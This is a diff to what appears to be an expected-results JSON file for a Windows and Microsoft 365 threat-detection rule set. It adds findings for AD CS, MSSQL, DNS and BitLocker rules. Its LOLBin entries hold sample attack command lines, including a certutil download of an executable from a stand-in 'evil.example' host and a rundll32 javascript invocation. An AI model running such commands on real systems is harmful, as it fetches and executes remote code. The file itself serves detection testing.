@@ -181,25 +181,25 @@
  "errors": [],
  "findings": {
   "collection-encoded-execution": [
-   "collection-encoded-execution|120"
+   "collection-encoded-execution|148"
   ],
   "collection-persistence-user-path": [
-   "collection-persistence-user-path|119"
+   "collection-persistence-user-path|147"
   ],
   "collection-prefetch-script-execution": [
-   "collection-prefetch-script-execution|123"
+   "collection-prefetch-script-execution|151"
   ],
   "collection-remote-service": [
-   "collection-remote-service|119"
+   "collection-remote-service|147"
   ],
   "collection-script-host-connection": [
-   "collection-script-host-connection|121"
+   "collection-script-host-connection|149"
   ],
   "collection-service-unquoted-path": [
-   "collection-service-unquoted-path|124"
+   "collection-service-unquoted-path|152"
   ],
   "m365-app-consent": [
-   "m365-app-consent|117"
+   "m365-app-consent|145"
   ],
   "m365-inbox-rule-any": [
    "m365-inbox-rule-any|80"
@@ -211,16 +211,16 @@
    "m365-inbox-rule-hiding|80"
   ],
   "m365-mailbox-forwarding": [
-   "m365-mailbox-forwarding|115"
+   "m365-mailbox-forwarding|143"
   ],
   "m365-mailitemsaccessed-burst": [
    "m365-mailitemsaccessed-burst|alice@contoso.com\u0001185.220.101.44|29804245"
   ],
   "m365-privileged-role-assigned": [
-   "m365-privileged-role-assigned|118"
+   "m365-privileged-role-assigned|146"
   ],
   "m365-role-assigned-any": [
-   "m365-role-assigned-any|118"
+   "m365-role-assigned-any|146"
   ],
   "m365-signin-bruteforce-account": [
    "m365-signin-bruteforce-account|alice@contoso.com|29804234"
@@ -232,13 +232,13 @@
    "m365-signin-password-spray|185.220.101.44|29804230"
   ],
   "m365-signin-risky": [
-   "m365-signin-risky|116"
+   "m365-signin-risky|144"
   ],
   "m365-signin-two-countries-24h": [
    "m365-signin-two-countries-24h|alice@contoso.com|29804070"
   ],
   "m365-signin-unexpected-country": [
-   "m365-signin-unexpected-country|116",
+   "m365-signin-unexpected-country|144",
    "m365-signin-unexpected-country|46"
   ],
   "mail-attachment-disguised": [
@@ -329,8 +329,29 @@
   "win-ad-server-object-created": [
    "win-ad-server-object-created|dc01\u0001cn=ws09,cn=servers,cn=default-first-site-name,cn=sites,cn=configuration,dc=corp,dc=local"
   ],
+  "win-adcs-audit-filter-changed": [
+   "win-adcs-audit-filter-changed|pki01\u0001alice"
+  ],
+  "win-adcs-ca-backup": [
+   "win-adcs-ca-backup|pki01\u0001alice"
+  ],
+  "win-adcs-ca-permissions-changed": [
+   "win-adcs-ca-permissions-changed|pki01\u0001alice"
+  ],
+  "win-adcs-request-with-san": [
+   "win-adcs-request-with-san|pki01\u0001corp\\alice\u0001esc1_user"
+  ],
+  "win-adcs-template-changed": [
+   "win-adcs-template-changed|pki01\u0001alice"
+  ],
   "win-audit-log-cleared": [
    "win-audit-log-cleared|91"
+  ],
+  "win-bitlocker-encryption-started": [
+   "win-bitlocker-encryption-started|ws01\u0001c:"
+  ],
+  "win-bitlocker-password-protector-added": [
+   "win-bitlocker-password-protector-added|ws01\u0001c:"
   ],
   "win-bruteforce-4625-by-account": [
    "win-bruteforce-4625-by-account|alice|29804250"
@@ -338,11 +359,23 @@
   "win-bruteforce-4625-by-ip": [
    "win-bruteforce-4625-by-ip|203.0.113.9|29804250"
   ],
+  "win-dns-server-logging-changed": [
+   "win-dns-server-logging-changed|dc01\u0001eventloglevel"
+  ],
+  "win-dns-server-plugin-dll-set": [
+   "win-dns-server-plugin-dll-set|dc01"
+  ],
+  "win-dns-wildcard-or-wpad-record": [
+   "win-dns-wildcard-or-wpad-record|dc01\u0001corp.local\u0001*.corp.local"
+  ],
   "win-domain-policy-changed-by-user": [
    "win-domain-policy-changed-by-user|dc01\u0001alice"
   ],
   "win-guest-account-enabled": [
    "win-guest-account-enabled|ws01\u0001s-1-5-21-1-2-3-501"
+  ],
+  "win-kdc-certificate-weak-mapping": [
+   "win-kdc-certificate-weak-mapping|dc01\u0001administrator"
   ],
   "win-logon-outside-business-hours": [
    "win-logon-outside-business-hours|2"
@@ -350,6 +383,33 @@
   "win-lolbin-suspicious-commandline": [
    "win-lolbin-suspicious-commandline|ws01\u0001\u0001c:\\windows\\system32\\rundll32.exe\u0001rundll32.exe javascript:\"\\..\\mshtml,runhtmlapplication\"",
    "win-lolbin-suspicious-commandline|ws01\u0001c:\\windows\\system32\\certutil.exe\u0001\u0001certutil.exe -urlcache -split -f http://evil.example/a.exe c:\\users\\public\\a.exe"
+  ],
+  "win-mssql-audit-tampered": [
+   "win-mssql-audit-tampered|sql01\u0001dba1\u0001server-audit-spec"
+  ],
+  "win-mssql-dangerous-option-enabled": [
+   "win-mssql-dangerous-option-enabled|sql01\u0001mssql$prod\u0001xp_cmdshell\n0\n1"
+  ],
+  "win-mssql-database-role-member-added": [
+   "win-mssql-database-role-member-added|sql01\u0001backdoor\u0001db_owner"
+  ],
+  "win-mssql-failed-logins-from-one-client": [
+   "win-mssql-failed-logins-from-one-client|sql01\u0001203.0.113.12|29804252"
+  ],
+  "win-mssql-login-created": [
+   "win-mssql-login-created|sql01\u0001dba1\u0001backdoor"
+  ],
+  "win-mssql-sa-enabled": [
+   "win-mssql-sa-enabled|sql01\u0001dba1"
+  ],
+  "win-mssql-sa-login-failed": [
+   "win-mssql-sa-login-failed|sql01\u0001203.0.113.12"
+  ],
+  "win-mssql-server-role-member-added": [
+   "win-mssql-server-role-member-added|sql01\u0001backdoor\u0001sysadmin"
+  ],
+  "win-mssql-single-user-mode": [
+   "win-mssql-single-user-mode|sql01\u0001mssql$prod"
   ],
   "win-office-spawns-shell": [
    "win-office-spawns-shell|84"
@@ -382,6 +442,9 @@
   ],
   "win-special-groups-table-changed": [
    "win-special-groups-table-changed|dc01"
+  ],
+  "win-sshd-password-guessing": [
+   "win-sshd-password-guessing|fs01\u0001203.0.113.13|29804253"
   ],
   "win-sysmon-network-lolbin": [
    "win-sysmon-network-lolbin|88"
@@ -490,6 +553,11 @@
   "win-ad-acl-changed-domain-root-or-adminsdholder",
   "win-ad-extended-right-modified",
   "win-ad-server-object-created",
+  "win-adcs-audit-filter-changed",
+  "win-adcs-ca-backup",
+  "win-adcs-ca-permissions-changed",
+  "win-adcs-request-with-san",
+  "win-adcs-template-changed",
   "win-admin-share-access",
   "win-anonymous-logon",
   "win-applocker-codeintegrity-block",
@@ -497,6 +565,8 @@
   "win-audit-log-cleared",
   "win-audit-policy-changed",
   "win-autoelevate-binary-unusual-parent",
+  "win-bitlocker-encryption-started",
+  "win-bitlocker-password-protector-added",
   "win-bits-download",
   "win-bits-job-notify-command",
   "win-boot-kernel-debug-enabled",
@@ -513,6 +583,9 @@
   "win-defender-detection",
   "win-defender-disabled",
   "win-directinput-from-user-folder",
+  "win-dns-server-logging-changed",
+  "win-dns-server-plugin-dll-set",
+  "win-dns-wildcard-or-wpad-record",
   "win-domain-policy-changed-by-user",
   "win-event-log-cleared",
   "win-event-log-service-stopped",
@@ -525,6 +598,7 @@
   "win-hacktool-privilege-enabled",
   "win-ieak-pending-gpo-persistence",
   "win-ipc-rpc-user-session-recon",
+  "win-kdc-certificate-weak-mapping",
   "win-kekeo-named-pipe",
   "win-kerberoasting",
   "win-kerberos-password-spray",
@@ -540,7 +614,16 @@
   "win-machine-account-password-reset",
   "win-msbuild-exec-task-script-host",
   "win-msiexec-quiet-install",
+  "win-mssql-audit-tampered",
+  "win-mssql-dangerous-option-enabled",
+  "win-mssql-database-role-member-added",
+  "win-mssql-failed-logins-from-one-client",
+  "win-mssql-login-created",
   "win-mssql-login-spray",
+  "win-mssql-sa-enabled",
+  "win-mssql-sa-login-failed",
+  "win-mssql-server-role-member-added",
+  "win-mssql-single-user-mode",
   "win-mssql-xpcmdshell-blocked",
   "win-network-share-created",
   "win-new-firewall-rule",
@@ -610,6 +693,7 @@
   "win-special-privileges-non-admin",
   "win-spooler-driver-dll",
   "win-spoolsv-unexpected-child",
+  "win-sshd-password-guessing",
   "win-suspicious-dns-sysmon",
   "win-sysmon-network-lolbin",
   "win-system-process-unsigned-dll",
